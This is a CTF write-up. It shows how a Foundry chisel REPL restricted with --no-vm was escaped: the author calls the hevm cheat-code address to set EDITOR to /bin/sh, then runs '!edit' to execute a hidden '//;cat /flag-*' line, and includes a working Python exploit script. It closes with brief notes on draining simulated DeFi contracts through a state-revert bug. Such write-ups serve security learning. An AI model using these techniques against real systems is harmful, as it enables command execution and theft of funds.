I played blaz CTF as [KimchiPremium](https://x.com/Web3Kimchi), had a lots of fun with awesome kimchi hackers

The server runs `chisel` with `--no-vm` option and the `-e`, `-exec` keyword are disabled. The filename of flag is random so we need get get a shell.

### chisel commands
---

```
No solidity versions installed! Installing solidity version 0.8.19...
Welcome to Chisel! Type `!help` to show available commands.
⚒️ Chisel help
=============
General
    !help | !h - Display all commands
    !quit | !q - Quit Chisel
    !exec <command> [args] | !e <command> [args] - Execute a shell command and print the output

Session
    !clear | !c - Clear current session source
    !source | !so - Display the source code of the current session
    !save [id] | !s [id] - Save the current session to cache
    !load <id> | !l <id> - Load a previous session ID from cache
    !list | !ls - List all cached sessions
    !clearcache | !cc - Clear the chisel cache of all stored sessions
    !export | !ex - Export the current session source to a script file
    !fetch <addr> <name> | !fe <addr> <name> - Fetch the interface of a verified contract on Etherscan
    !edit - Open the current session in an editor

Environment
    !fork <url> | !f <url> - Fork an RPC for the current session. Supply 0 arguments to return to a local network
    !traces | !t - Enable / disable traces for the current session
    !calldata [data] | !cd [data] - Set calldata (`msg.data`) for the current session (appended after function selector). Clears it if no argument provided.

Debug
    !memdump | !md - Dump the raw memory of the current state
    !stackdump | !sd - Dump the raw stack of the current state
    !rawstack <var> | !rs <var> - Display the raw value of a variable's stack allocation. For variables that are > 32 bytes in length, this will display their memory pointer.
```
To execute shell command, we need to find some command that uses `process::Command`. Not only `exec`, but also `edit` command uses `Command` to open the editor.

```rust
ChiselCommand::Edit => {
    // create a temp file with the content of the run code
    let mut temp_file_path = std::env::temp_dir();
    temp_file_path.push("chisel-tmp.sol");
    let result = std::fs::File::create(&temp_file_path)
        .map(|mut file| file.write_all(self.source().run_code.as_bytes()));
    if let Err(e) = result {
        return DispatchResult::CommandFailed(format!(
            "Could not write to a temporary file: {e}"
        ))
    }

    // open the temp file with the editor
    let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vim".to_string());
    let mut cmd = Command::new(editor);
    cmd.arg(&temp_file_path);

    match cmd.status() {
...
```
In the `edit` command, it saves the current running code to a `/tmp/chisel-tmp.sol` and executes the editor with the file as an argument.

With [setEnv](https://book.getfoundry.sh/cheatcodes/set-env) function in Vm cheat code, we can set the `EDITOR` environment variable to `/bin/sh` and execute the contents of the running code as a shell script. but the `--no-vm` flag is set. what's actually that flag? 

### --no-vm flag
---
```rust
 pub fn to_repl_source(&self) -> String {
    let Version { major, minor, patch, .. } = self.solc.version;
    let Self { contract_name, global_code, top_level_code, run_code, config, .. } = self;

    let (vm_import, vm_constant) = if !config.no_vm {
        (
            "import {Vm} from \"forge-std/Vm.sol\";\n",
            "Vm internal constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n"
        )
    } else {
        ("", "")
    };
```
In the chisel code, with `--no-vm` flag, it does not import the `Vm` contract and does not set the `vm` constant. that's all. we can still call the cheat code in Vm contract with the address `address(uint160(uint256(keccak256("hevm cheat code"))))`.

So, by setting the `EDITOR` environment variable to `/bin/sh`, we can executes the contents of the running code as a shell script. But the running code need to be a valid solidity code. we can just add comment with `;` and execute the shell script like `//; cat /flag-*`.

### exploit
---
```python
import requests

url = "http://snwo.kr:3000/"

code = """
//;cat /flag-*
address hevm = address(uint160(uint256(keccak256("hevm cheat code"))));
interface VM { function setEnv(string calldata key, string calldata value) external; }
VM vm = VM(hevm);
vm.setEnv("EDITOR", "/bin/sh");
!edit
"""
uuid = requests.get(url+"run",params={"code":code}).json()['uuid']

r = requests.get(url+"out/"+uuid)
print(r.text)
```

just a brief writeup. we total earned `19,986,007` ETH. There is a bug that each state related opcodes do recover the state when it reverts. So we can leverag this to bypass check balance or smth.
for example, maker dao contract first mint a token and check the balance. the `sstore` opcode does not recover the state when it reverts. so we can still get the minted tokens after it reverts.

we stole all the weth pair of top TVL swaps, and also flash loan contracts, bridge, or smth.
